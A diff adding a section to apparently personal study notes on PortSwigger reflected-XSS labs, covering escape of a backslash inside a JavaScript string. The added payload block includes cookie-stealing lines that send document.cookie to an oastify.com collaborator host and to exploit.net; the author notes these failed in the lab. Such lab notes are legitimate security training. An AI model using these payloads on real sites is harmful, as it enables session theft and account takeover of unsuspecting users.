@@ -339,6 +339,27 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
 
 [PortSwigger Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)  
   
+### Reflected String Extra Escape  
+
+>See in source code the variable named ```searchTerms```, and when submitting payload ```fuzzer'payload```, see the single quote is backslash escaped, and then send a  ```fuzzer\payload``` payload and ***identify*** that the backslash is not escaped.  
+
+```
+\'-alert(1)//  
+
+\'-document.location=\`https://prke1jwb2kj1o2okhwai71twenke86wv.oastify.com/?ticks=\`+document.cookie//
+\'-fetch(\'https://prke1jwb2kj1o2okhwai71twenke86wv.oastify.com/?ticks=\'+document.cookie)//
+\'-document.write(`<img src="https://exploit.net?cookieStealer='+document.cookie+'" />`);
+<script>
+document.write('<img src="https://exploit.net?cookieStealer='+document.cookie+'" />');
+</script>
+```  
+
+>^^ Failed to change above alert into cookie stealer payload that send session token to collaborator. sad face :-(  
+  
+![fail-escape](images/fail-escape.png)  
+  
+[PortSwigger Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)  
+  
 ### XSS Template Literal  
 
 >JavaScript template literal is ***identified*** by the back ticks **`** used to contain the string. On the target code we ***identify*** the search string is reflected inside a template literal string.  
